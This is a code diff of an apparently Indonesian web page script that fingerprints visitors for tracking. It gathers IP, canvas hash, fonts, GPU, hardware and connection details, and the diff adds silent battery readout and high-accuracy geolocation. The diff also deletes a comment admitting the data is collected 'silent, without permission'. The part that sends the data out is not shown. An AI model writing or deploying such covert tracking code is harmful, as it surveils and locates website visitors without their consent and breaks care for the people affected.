@@ -56,7 +56,7 @@
                 const deviceMemory = navigator.deviceMemory || "Unknown";
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const language = navigator.language;
-                const touchPoints = navigator.maxTouchPoints || 0; // Touchscreen support
+                const touchPoints = navigator.maxTouchPoints || 0;
 
                 // Canvas Fingerprint (unik per device)
                 const canvas = document.createElement('canvas');
@@ -113,13 +113,52 @@
                     rtt: connection.rtt || "Unknown"
                 };
 
+                // Battery Status (silent di Chrome/Edge)
+                let batteryData = { level: "Unknown", charging: "Unknown", chargingTime: "Unknown", dischargingTime: "Unknown" };
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        batteryData = {
+                            level: battery.level * 100, // Persen
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    }
+                } catch (e) {}
+
+                // Geolocation (TRIGGER POP-UP, tidak silent)
+                let geolocationData = { latitude: "Unknown", longitude: "Unknown", accuracy: "Unknown", timestamp: "Unknown" };
+                try {
+                    if (navigator.geolocation) {
+                        await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    geolocationData = {
+                                        latitude: position.coords.latitude,
+                                        longitude: position.coords.longitude,
+                                        accuracy: position.coords.accuracy, // Dalam meter
+                                        timestamp: position.timestamp
+                                    };
+                                    resolve();
+                                },
+                                (error) => {
+                                    console.error('Geolocation error:', error); // Silent error
+                                    resolve(); // Lanjut meskipun gagal
+                                },
+                                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                            );
+                        });
+                    }
+                } catch (e) {}
+
                 // Timestamp di GMT+7 (Asia/Jakarta)
                 const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
 
-                // Data yang dikirim (semua silent, tanpa izin)
+                // Data yang dikirim
                 const data = {
                     ip: userIP, // Berubah: VPN, proxy
-                    browser: browser, // Tetap: kecuali user ganti browser
+                    browser: browser, // Tetap: kecuali ganti browser
                     os: os, // Tetap: kecuali ganti device
                     userAgent: userAgent, // Tetap: kecuali ganti browser/device
                     screenResolution: screenRes, // Tetap: kecuali ganti monitor
@@ -127,15 +166,17 @@
                     colorDepth: colorDepth, // Tetap: kecuali ganti monitor
                     cpuCores: cpuCores, // Tetap: per device
                     deviceMemory: deviceMemory, // Tetap: per device
-                    timezone: timezone, // Berubah: kalo user ganti setting
-                    language: language, // Berubah: kalo user ganti setting
+                    timezone: timezone, // Berubah: kalo ganti setting
+                    language: language, // Berubah: kalo ganti setting
                     touchPoints: touchPoints, // Tetap: per device
                     canvasHash: canvasHash, // Tetap: unik per device
                     installedFonts: fonts.join(', '), // Tetap: kecuali install font
                     webglVendor: webglVendor, // Tetap: per GPU
                     webglRenderer: webglRenderer, // Tetap: per GPU
-                    referrer: document.referrer, // Berubah: tergantung dari mana masuk
+                    referrer: document.referrer, // Berubah: tergantung link
                     connection: connectionData, // Berubah: WiFi/4G/5G
+                    battery: batteryData, // Berubah: level baterai, charging
+                    geolocation: geolocationData, // Berubah: lokasi user, NOT SILENT
                     timestamp: timestamp // Berubah: per waktu
                 };
 
